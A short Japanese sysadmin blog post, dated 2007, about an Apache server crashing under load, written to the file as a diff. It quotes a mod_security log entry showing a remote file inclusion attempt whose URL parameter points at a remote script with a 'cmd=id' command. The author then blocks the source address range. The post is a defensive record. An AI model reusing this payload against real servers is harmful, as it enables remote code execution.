@@ -1,0 +1,25 @@
+﻿またか…。
+##########
+
+
+今週もMaxClientsで落ちた。うーん、変なアクセスをしてくるところが多いのと、サーチエンジンのロボット検索がやたら増えてきたなぁ。で、明らかにおかしいリクエストを出して、modsecurityで落ちている。
+
+.. code-block:: none
+
+   [Sat Mar 31 10:23:22 2007] [error] [client 201.79.41.96] mod_security: Access de
+   nied with code 500. Pattern match &#34;^$&#34; at HEADER [hostname &#34;hogehoge&#34;] [ur
+   i &#34;http://hogehoge/index.php?XA4F2B5AFC6B0A4C7A4ADA4CAA4A413kfl72.14.209.1
+   04/cache:ELL9KACjZWUJ:hogehoge/index.php3FX25A425F225B525AF25C625B025A425C
+   725A425AD25A425CA25A425A4=http://prm.hardbr.com/tool25.txt?cmd=id&#34;]
+
+
+このアクセス元を逆引きすると、20178001001.user.veloxzone.com.br.のような感じで引ける。アドレス範囲は201.78.0.0/15で、ブラジルからなので、来てもらわんでも特に問題なし。すべて許否することにした。
+それにしても、なんとかしないとなぁ、この状況。１月から、２、３月とアクセスが２倍、３倍と増えてきてるもんなぁ。そろそろやばいか。
+
+
+
+.. author:: mkouhei
+.. categories:: security, Unix/Linux, 
+.. tags::
+
+
